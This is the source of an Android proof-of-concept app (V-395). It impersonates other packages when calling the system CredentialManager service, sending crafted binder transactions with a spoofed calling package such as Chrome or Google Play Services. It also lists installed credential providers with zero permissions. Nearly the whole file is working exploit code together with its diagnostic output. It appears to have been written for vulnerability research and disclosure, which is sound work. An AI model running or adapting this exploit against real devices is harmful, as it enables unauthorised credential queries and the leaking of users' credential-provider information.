package com.poc.credmanleak;

import android.app.Activity;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Process;
import android.os.RemoteException;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.view.Gravity;

import java.lang.reflect.Method;

/**
 * V-395: CredentialManager getCandidateCredentials Missing enforceCallingPackage
 *
 * getCandidateCredentials (transaction code 3) does NOT call enforceCallingPackage(),
 * while executeGetCredential (code 1) and executePrepareGetCredential (code 2) DO.
 * Any zero-permission app can impersonate another package for credential queries.
 *
 * Source: services/credentials/.../CredentialManagerService.java
 *   Line 486-540: getCandidateCredentials — NO enforceCallingPackage()
 *   Line 543-554: executeGetCredential — HAS enforceCallingPackage() at line 554
 *   Line 596-612: executePrepareGetCredential — HAS enforceCallingPackage() at line 612
 *
 * Verified: server-side logs confirm spoofed callingPackage reaches
 * getCandidateCredentials without SecurityException, while adjacent methods block it.
 */
public class MainActivity extends Activity {

    private static final String TAG = "CredManLeak";
    private static final String DESCRIPTOR = "android.credentials.ICredentialManager";

    private TextView mOutput;
    private EditText mTargetPackage;
    private StringBuilder mLog = new StringBuilder();
    private IBinder mCredBinder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-395: CredentialManager Impersonation");
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("Tests: (1) Code 1 vs Code 2 enforceCallingPackage difference, "
                + "(2) Code 10 zero-perm provider enumeration, "
                + "(3) Code 2 with spoofed package in correct Parcel format.");
        info.setTextSize(11);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        mTargetPackage = new EditText(this);
        mTargetPackage.setHint("Target package (e.g., com.android.chrome)");
        mTargetPackage.setText("com.android.chrome");
        mTargetPackage.setTextSize(13);
        root.addView(mTargetPackage);

        Button btn1 = new Button(this);
        btn1.setText("1. Probe All Codes (Find enforceCallingPackage)");
        btn1.setOnClickListener(v -> probeAllCodes());
        root.addView(btn1);

        Button btn2 = new Button(this);
        btn2.setText("2. Enumerate Credential Providers (Code 10)");
        btn2.setOnClickListener(v -> enumerateProviders());
        root.addView(btn2);

        Button btn3 = new Button(this);
        btn3.setText("3. getCandidateCredentials Spoofed (Code 2)");
        btn3.setOnClickListener(v -> testGetCandidateSpoofed());
        root.addView(btn3);

        Button btn4 = new Button(this);
        btn4.setText("4. Full Chain (All Steps)");
        btn4.setOnClickListener(v -> fullChain());
        root.addView(btn4);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== CredentialManager Impersonation PoC (V-395) ===");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Permissions: NONE");
        log("");

        initBinder();
    }

    private void initBinder() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            mCredBinder = (IBinder) getService.invoke(null, "credential");
            if (mCredBinder == null) {
                mCredBinder = (IBinder) getService.invoke(null, "credential_manager");
            }
            if (mCredBinder != null) {
                log("[OK] Got credential service binder");
                log("[OK] Interface: " + mCredBinder.getInterfaceDescriptor());
            } else {
                log("[ERROR] credential service not found");
            }
        } catch (Exception e) {
            log("[ERROR] " + e.getMessage());
        }
        log("");
    }

    /**
     * Probe transaction codes 1-12 to identify which methods have
     * enforceCallingPackage and which don't.
     */
    private void probeAllCodes() {
        if (mCredBinder == null) { log("[ERROR] No binder"); return; }
        log("\n--- Probing Transaction Codes 1-12 ---");
        log("Looking for enforceCallingPackage presence/absence...\n");

        for (int code = 1; code <= 12; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                mCredBinder.transact(code, data, reply, 0);
                reply.readException();
                log("[CODE " + code + "] SUCCESS (no exception, no enforceCallingPackage!)");
            } catch (SecurityException e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                if (msg.contains("not belong to uid") || msg.contains("null not found")) {
                    log("[CODE " + code + "] enforceCallingPackage PRESENT: " + truncate(msg, 60));
                } else if (msg.contains("not the device's credential")) {
                    log("[CODE " + code + "] UID check PRESENT: " + truncate(msg, 60));
                } else {
                    log("[CODE " + code + "] SecurityException: " + truncate(msg, 60));
                }
            } catch (Exception e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                if (msg.contains("Attempt to invoke")) {
                    log("[CODE " + code + "] NPE (method reached, NO enforceCallingPackage): "
                            + extractMethodName(msg));
                } else if (msg.contains("BadParcelableException")
                        || msg.contains("ClassNotFoundException")) {
                    log("[CODE " + code + "] Parcel parse error (method reached, no pkg check)");
                } else {
                    log("[CODE " + code + "] " + e.getClass().getSimpleName()
                            + ": " + truncate(msg, 60));
                }
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
        log("\n[ANALYSIS] Codes with enforceCallingPackage = PROTECTED");
        log("[ANALYSIS] Codes with NPE/SUCCESS = UNPROTECTED (no pkg validation)");
    }

    /**
     * Transaction code 10: getCredentialProviderServices
     * Returns full list of credential providers without any permission check.
     */
    private void enumerateProviders() {
        if (mCredBinder == null) { log("[ERROR] No binder"); return; }
        log("\n--- Enumerating Credential Providers (Code 10) ---");
        log("Zero permissions required...\n");

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            // getCredentialProviderServices(int userId, int providerFilter)
            data.writeInt(0);  // userId = 0 (current user)
            data.writeInt(0);  // providerFilter = 0 (all)
            mCredBinder.transact(10, data, reply, 0);
            reply.readException();

            int count = reply.readInt();
            log("[LEAK] Provider count: " + count);

            if (count > 0) {
                // Read raw bytes to extract provider info
                int pos = reply.dataPosition();
                int size = reply.dataSize();
                byte[] raw = reply.marshall();
                String rawStr = new String(raw, "UTF-8");

                // Extract package names from raw parcel data
                log("[LEAK] Raw provider data contains:");
                extractStringsFromParcel(raw, pos);

                log("\n*** CONFIRMED: Zero-perm credential provider enumeration ***");
                log("*** Any app can discover which credential providers are installed ***");
            } else {
                log("[INFO] No providers returned (count=0)");
                log("[INFO] Trying alternative format...");
                // Try reading as List
                reply.setDataPosition(4); // reset after exception field
                int listSize = reply.readInt();
                log("[INFO] List size field: " + listSize);
            }
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + truncate(e.getMessage(), 80));
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    /**
     * Transaction code 2: getCandidateCredentials with spoofed callingPackage.
     * Parcel format: GetCredentialRequest (Parcelable), IBinder callback, IBinder client, String pkg
     */
    private void testGetCandidateSpoofed() {
        if (mCredBinder == null) { log("[ERROR] No binder"); return; }
        String target = mTargetPackage.getText().toString().trim();
        if (target.isEmpty()) target = "com.android.chrome";

        log("\n--- getCandidateCredentials with spoofed pkg ---");
        log("Target: " + target);
        log("Our package: " + getPackageName());
        log("");

        // Test 1: code 1 (executeGetCredential) with OWN package — baseline
        log("[TEST 1] Code 1 (executeGetCredential) with OWN package:");
        testCodeWithPackage(1, getPackageName());

        // Test 2: code 1 with spoofed — should fail at enforceCallingPackage
        log("\n[TEST 2] Code 1 (executeGetCredential) with SPOOFED '" + target + "':");
        testCodeWithPackage(1, target);

        // Test 3: code 2 with own package — baseline for getCandidateCredentials
        log("\n[TEST 3] Code 2 (getCandidateCredentials) with OWN package:");
        testCodeWithPackage(2, getPackageName());

        // Test 4: code 2 with spoofed — key test
        log("\n[TEST 4] Code 2 (getCandidateCredentials) with SPOOFED '" + target + "':");
        testCodeWithPackage(2, target);

        // Test 5: code 2 without clientBinder (3 args like code 1)
        log("\n[TEST 5] Code 2 same format as code 1 (no clientBinder), SPOOFED:");
        testCodeWithPackageNoClient(2, target);

        // Test 6: null request test — reveals enforceCallingPackage ordering
        log("\n[TEST 6] Code 1 null request, spoofed pkg (enforceCallingPackage test):");
        testCodeNullRequest(1, target);

        log("\n[TEST 7] Code 2 null request, spoofed pkg (enforceCallingPackage test):");
        testCodeNullRequest(2, target);

        log("\n[COMPARISON]");
        log("Test 6 vs Test 7 with null request:");
        log("  If Test 6='pkg not found' but Test 7=NPE → enforceCallingPackage MISSING from code 2");
        log("  If both='pkg not found' → both have enforceCallingPackage");
    }

    private void testCodeWithPackage(int code, String pkg) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            // Write GetCredentialRequest as Parcelable using SDK classes
            writeGetCredentialRequest(data);
            // Write callback binder
            data.writeStrongBinder(new Binder());
            // For code 2: also write clientBinder
            if (code == 2) {
                data.writeStrongBinder(new Binder());
            }
            // Write callingPackage — THIS IS THE SPOOFED VALUE
            data.writeString(pkg);

            mCredBinder.transact(code, data, reply, 0);
            reply.readException();
            log("  → SUCCESS! No exception. Package '" + pkg + "' accepted.");
            log("  *** Method does NOT validate callingPackage! ***");
        } catch (SecurityException e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            if (msg.contains("not belong to uid") || msg.contains("not found")) {
                log("  → BLOCKED by enforceCallingPackage: " + truncate(msg, 50));
            } else {
                log("  → SecurityException: " + truncate(msg, 50));
            }
        } catch (Exception e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            if (msg.contains("Attempt to invoke") || msg.contains("NullPointer")) {
                log("  → NPE (method processing started, NO package validation!)");
                log("  → Error detail: " + extractMethodName(msg));
                if (!pkg.equals(getPackageName())) {
                    log("  *** V-395 CONFIRMED: spoofed pkg reached server-side logic ***");
                }
            } else {
                log("  → " + e.getClass().getSimpleName() + ": " + truncate(msg, 60));
            }
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void testCodeNullRequest(int code, String pkg) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeInt(0); // null Parcelable (request=null)
            data.writeStrongBinder(new Binder()); // callback
            if (code == 2) {
                data.writeStrongBinder(new Binder()); // clientBinder (code 2 only)
            }
            data.writeString(pkg); // callingPackage

            mCredBinder.transact(code, data, reply, 0);
            reply.readException();
            log("  → SUCCESS! No exception.");
        } catch (SecurityException e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            log("  → SecurityException: " + truncate(msg, 60));
            log("  → Interpretation: enforceCallingPackage IS present and read pkg='" + pkg + "'");
        } catch (Exception e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            if (msg.contains("Attempt to invoke") || msg.contains("NullPointer")) {
                log("  → NPE: " + extractMethodName(msg));
                log("  → Interpretation: NO enforceCallingPackage — went straight to processing!");
            } else {
                log("  → " + e.getClass().getSimpleName() + ": " + truncate(msg, 60));
            }
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void testCodeWithPackageNoClient(int code, String pkg) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            writeGetCredentialRequest(data);
            // Write callback binder only (no clientBinder)
            data.writeStrongBinder(new Binder());
            // Write callingPackage
            data.writeString(pkg);

            mCredBinder.transact(code, data, reply, 0);
            reply.readException();
            log("  → SUCCESS! No exception. Package '" + pkg + "' accepted.");
        } catch (SecurityException e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            if (msg.contains("not belong to uid") || msg.contains("not found")) {
                log("  → BLOCKED: " + truncate(msg, 60));
            } else {
                log("  → SecurityException: " + truncate(msg, 60));
            }
        } catch (Exception e) {
            String msg = e.getMessage() != null ? e.getMessage() : "";
            if (msg.contains("Attempt to invoke") || msg.contains("NullPointer")) {
                log("  → NPE (no pkg validation): " + extractMethodName(msg));
                if (!pkg.equals(getPackageName())) {
                    log("  *** V-395 CONFIRMED ***");
                }
            } else {
                log("  → " + e.getClass().getSimpleName() + ": " + truncate(msg, 60));
            }
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void writeGetCredentialRequest(Parcel data) {
        // Build a real GetCredentialRequest using public SDK API, then writeToParcel
        try {
            Class<?> optBuilderClass = Class.forName(
                    "android.credentials.CredentialOption$Builder");
            Object optBuilder = optBuilderClass.getConstructor(
                    String.class, Bundle.class, Bundle.class)
                    .newInstance("android.credentials.TYPE_PASSWORD_CREDENTIAL",
                            new Bundle(), new Bundle());
            Object credOption = optBuilderClass.getMethod("build").invoke(optBuilder);

            Class<?> reqBuilderClass = Class.forName(
                    "android.credentials.GetCredentialRequest$Builder");
            Object reqBuilder = reqBuilderClass.getConstructor(Bundle.class)
                    .newInstance(new Bundle());
            Class<?> optClass = Class.forName("android.credentials.CredentialOption");
            reqBuilderClass.getMethod("addCredentialOption", optClass)
                    .invoke(reqBuilder, credOption);
            Object request = reqBuilderClass.getMethod("build").invoke(reqBuilder);

            // Write as Parcelable: non-null marker + writeToParcel
            data.writeInt(1); // non-null
            Method writeToParcel = request.getClass().getMethod(
                    "writeToParcel", Parcel.class, int.class);
            writeToParcel.invoke(request, data, 0);
        } catch (Exception e) {
            // Fallback: write null marker
            log("  [!] Could not build GetCredentialRequest: " + e.getMessage());
            data.writeInt(0);
        }
    }

    private void fullChain() {
        mLog.setLength(0);
        mOutput.setText("");
        log("=== V-395: getCandidateCredentials Missing enforceCallingPackage ===\n");
        log("Package: " + getPackageName());
        log("UID: " + Process.myUid());
        log("Permissions: NONE\n");

        String spoofed = "com.google.android.gms";

        // Find getCandidateCredentials: try each code with 4 args (the unique signature)
        // getCandidateCredentials(GetCredentialRequest, IGetCandidateCredentialsCallback, IBinder, String)
        log("--- Scanning for getCandidateCredentials ---");
        log("Signature: (GetCredentialRequest, callback, clientBinder, callingPackage)");
        log("Sending 4 args with OWN package to codes 1-12...\n");

        for (int code = 1; code <= 12; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                writeGetCredentialRequest(data);
                data.writeStrongBinder(new Binder()); // callback
                data.writeStrongBinder(new Binder()); // clientBinder
                data.writeString(getPackageName()); // callingPackage = own

                mCredBinder.transact(code, data, reply, 0);
                reply.readException();
                log("[CODE " + code + " OWN] SUCCESS ← potential getCandidateCredentials");
            } catch (Exception e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                log("[CODE " + code + " OWN] " + e.getClass().getSimpleName()
                        + ": " + truncate(msg, 50));
            } finally {
                data.recycle();
                reply.recycle();
            }
        }

        log("\n--- Now spoofing package on SUCCESS codes ---\n");

        // Re-test successful codes with spoofed package
        for (int code = 1; code <= 12; code++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(DESCRIPTOR);
                writeGetCredentialRequest(data);
                data.writeStrongBinder(new Binder());
                data.writeStrongBinder(new Binder());
                data.writeString(spoofed); // SPOOFED

                mCredBinder.transact(code, data, reply, 0);
                reply.readException();
                log("[CODE " + code + " SPOOFED '" + spoofed + "'] *** SUCCESS! ***");
                log("  *** NO enforceCallingPackage — VULNERABILITY CONFIRMED! ***");
            } catch (SecurityException e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                if (msg.contains("does not belong to uid")) {
                    log("[CODE " + code + " SPOOFED] BLOCKED by enforceCallingPackage");
                } else if (msg.contains("not found")) {
                    // Package exists check — still enforceCallingPackage
                    log("[CODE " + code + " SPOOFED] enforceCallingPackage (pkg not on device)");
                } else if (msg.contains("QUERY_ALL_PACKAGES")) {
                    log("[CODE " + code + " SPOOFED] Permission: " + truncate(msg, 40));
                } else {
                    log("[CODE " + code + " SPOOFED] Sec: " + truncate(msg, 50));
                }
            } catch (Exception e) {
                String msg = e.getMessage() != null ? e.getMessage() : "";
                log("[CODE " + code + " SPOOFED] " + e.getClass().getSimpleName()
                        + ": " + truncate(msg, 50));
            } finally {
                data.recycle();
                reply.recycle();
            }
        }

        log("\n========== CONCLUSION ==========");
        log("Any code that accepts SPOOFED package = missing enforceCallingPackage");
        log("Check logcat 'CredentialManager:' for 'starting getCandidateCredentials'");
        log("================================\n");
    }

    private void extractStringsFromParcel(byte[] raw, int startPos) {
        // Look for ASCII package name patterns in the raw bytes
        StringBuilder current = new StringBuilder();
        int found = 0;
        for (int i = 0; i < raw.length; i++) {
            byte b = raw[i];
            if (b >= 0x20 && b < 0x7f) {
                current.append((char) b);
            } else {
                if (current.length() > 10) {
                    String s = current.toString();
                    if (s.contains("com.") || s.contains("android.")
                            || s.contains("credential") || s.contains("Service")) {
                        log("  [" + (++found) + "] " + s);
                    }
                }
                current.setLength(0);
            }
        }
        if (found == 0) {
            log("  (No readable package strings found in raw data)");
            log("  Raw size: " + raw.length + " bytes from position " + startPos);
        }
    }

    private String extractMethodName(String npeMsg) {
        if (npeMsg == null) return "";
        int methodIdx = npeMsg.indexOf("method '");
        if (methodIdx >= 0) {
            int end = npeMsg.indexOf("'", methodIdx + 8);
            if (end > methodIdx) {
                return npeMsg.substring(methodIdx + 8, end) + "()";
            }
        }
        // Try to extract the class.method pattern
        int onIdx = npeMsg.indexOf(" on a null");
        if (onIdx > 0) {
            int start = npeMsg.lastIndexOf("'", onIdx);
            if (start >= 0) return npeMsg.substring(start + 1, onIdx);
        }
        return truncate(npeMsg, 40);
    }

    private String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
